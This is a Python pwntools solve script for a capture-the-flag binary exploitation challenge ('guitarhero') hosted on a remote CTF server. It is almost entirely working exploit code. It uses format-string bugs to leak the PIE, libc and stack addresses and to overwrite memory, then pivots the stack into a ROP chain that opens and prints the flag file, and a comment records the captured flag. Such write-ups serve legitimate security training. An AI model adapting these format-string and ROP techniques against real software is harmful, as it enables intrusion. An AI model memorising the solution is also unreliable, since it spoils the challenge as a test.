#!/usr/bin/env python3

from pwn import *
import sys
from typing import Union

binary = ELF("./guitarhero_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = binary
context.terminal = ["tmux", "splitw", "-h", "-e", "GDB=pwndbg"]
context.arch = binary.arch

def one_gadget(filename: str) -> list:
    return [int(i) for i in
            __import__('subprocess').check_output(['one_gadget', '--raw', filename]).decode().split(' ')]


GDB_SCRIPT = '''
b *show_video+552
'''.strip()


def conn() -> Union[process, remote]:
    io = None
    for arg in sys.argv[1:]:
        # ./solve <any option> d
        if arg == 'd':
            context.log_level = 'debug'
        # ./solve l
        if arg == 'l':
            io = process([binary.path])
        # ./solve g
        elif arg == 'g':
            io = gdb.debug([binary.path], gdbscript=GDB_SCRIPT)
    # $ ./solve
    if io is None:
        io = remote("ctf.adl.tw", 10009)
    return io


def main():
    io = conn()

    info("leakng pie base")
    io.sendlineafter(b"> ", b"2")
    payload = b"%11$pEND"
    io.sendafter(b":\n", payload)
    payload = flat(b"3\n", length=8)
    # payload += p8(binary.sym["action"] & 0xff)
    io.sendafter(b"> ", payload)
    io.recvuntil(b"0x")
    _start_address = int(io.recvuntil(b"END", drop=True), 16)
    info(f"_start address: {_start_address:#x}")
    binary.address = _start_address - binary.sym["_start"]
    success(f"pie base: {binary.address:#x}")
    success(f"&action: {binary.sym['action']:#x}")


    info("(int)action = 100")
    io.sendlineafter(b"> ", b"2")
    payload = b"%100c%11$nEND"
    io.sendafter(b":\n", payload)
    payload = flat({
        0x00: b"3\n",
        0x08: p64(binary.sym["action"])[:-1],
    }, length=0xf)
    io.sendafter(b"> ", payload)
    io.recvuntil(b"END")


    info("leaking libc base")
    payload = b"%15$pEND"
    io.sendlineafter(b"> ", b"2")
    io.sendafter(b":\n", payload)
    io.sendafter(b"> ", b"3\n")
    io.recvuntil(b"0x")
    __libc_start_main_243 = int(io.recvuntil(b"END", drop=True), 16)
    info(f"__libc_start_main+243: {__libc_start_main_243:#x}")
    libc.address = __libc_start_main_243 - libc.sym["__libc_start_main"] - 243
    success(f"libc base: {libc.address:#x}")
    success(f"read: {libc.sym['read']:#x}")


    info("leaking stack address")
    payload = b"%6$pEND"
    io.sendlineafter(b"> ", b"2")
    io.sendafter(b":\n", payload)
    io.sendafter(b"> ", b"3\n")
    io.recvuntil(b"0x")
    saved_rbp = int(io.recvuntil(b"END", drop=True), 16)
    success(f"saved rbp: {saved_rbp:#x}")
    current_rbp = saved_rbp - 0x40
    success(f"current rbp: {current_rbp:#x}")


    info("stack pivot rbp to rbp-0x18 for rop")
    target = saved_rbp - 0x18
    payload = f"%{target & 0xffff}c%11$hnEND".encode()
    io.sendlineafter(b"> ", b"2")
    io.sendafter(b":\n", payload)
    payload = flat({
        0x00: b"3\n",
        0x08: p64(current_rbp)[:-1],
    })
    io.sendafter(b"> ", payload)
    io.recvuntil(b"END")


    info("rop to open flag then read/print flag")
    payload = flat({
        0x00: p64(0x19530a + libc.address), # mov edx, 0x94d3ff3 ; ret
        0x08: p64(libc.sym["read"])[:-1], # read(0, rbp-0x20, 0x94d3ff3)
    }, length=0xf)
    io.sendafter(b"> ", payload)
    rop = ROP(libc)
    filename = b"/home/guitarhero/flag\0"
    flag_offset = 0x80
    payload = flat(
        0x4141414141414141,
        0x4242424242424242,
        rop.find_gadget(["pop rdi", "ret"]).address,
        target - 0x20 + flag_offset,
        rop.find_gadget(["pop rsi", "ret"]).address,
        0,
        binary.address + 0x1ab8,  # open/read gadget
        length=flag_offset,
    )
    payload += filename
    io.send(payload)

    result = io.recvall()
    flag = result[result.index(b"ADL{"): result.index(b"}") + 1]
    success(f"flag: {flag.decode()}")  # ADL{5h0un1n_y0kkyuu_m0n573r!!!https://youtu.be/IwHwv-lcxi4}


if __name__ == "__main__":
    main()
